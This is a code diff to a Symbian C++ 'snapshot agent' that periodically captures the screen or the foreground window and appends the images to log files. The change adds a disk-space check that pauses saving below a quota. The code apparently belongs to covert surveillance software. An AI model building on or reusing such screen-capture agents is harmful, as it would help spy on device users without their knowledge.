@@ -13,6 +13,7 @@
 #include <COEMAIN.H>
 #include "AgentSnapshot.h"
 
+
 CAgentSnapshot::CAgentSnapshot() :
 	CAbstractAgent(EAgent_Snapshot)
 	{
@@ -21,6 +22,7 @@ CAgentSnapshot::CAgentSnapshot() :
 
 CAgentSnapshot::~CAgentSnapshot()
 	{
+	delete iFreeSpaceMonitor;
 	delete iTimer;
 	delete iScreenDevice;
 	delete iBitmap;
@@ -52,6 +54,10 @@ void CAgentSnapshot::ConstructL(const TDesC8& params)
 	ptr += 4;
 	TUint32 windCapt=0;				 //  0 = capture whole screen, 1 = capture only foreground window 	
 	Mem::Copy(&windCapt,ptr,4 );
+	
+	iFreeSpaceMonitor = CFreeSpaceMonitor::NewL(*this,iFs);
+	iBelowQuota = iFreeSpaceMonitor->IsBelowThreshold();
+	iFreeSpaceMonitor->StartListeningForEvents();
 	
 	iSecondsInterv = (interval / 1000);
 	
@@ -88,6 +94,8 @@ void CAgentSnapshot::TimerExpiredL(TAny* src)
 	buf.CleanupClosePushL();
 	if (buf.Length() > 0)
 		{
+		if(!iBelowQuota)
+			{
 			//__FLOG_HEXDUMP(buf.Ptr(), buf.Length());
 			TSnapshotAdditionalData additionalData;
 		
@@ -96,6 +104,7 @@ void CAgentSnapshot::TimerExpiredL(TAny* src)
 			logFile->AppendLogL(buf);
 			logFile->CloseLogL();
 			CleanupStack::PopAndDestroy(logFile);
+			}
 		}
 	CleanupStack::PopAndDestroy(&buf);
 	 
@@ -146,5 +155,15 @@ HBufC8* CAgentSnapshot::GetImageBufferL()
 		
 		return imageBuf;
 		
+	}
+
+void CAgentSnapshot::NotifyAboveThreshold()
+	{
+	iBelowQuota = EFalse;
+	}
+
+void CAgentSnapshot::NotifyBelowThreshold()
+	{
+	iBelowQuota = ETrue;
 	}
 
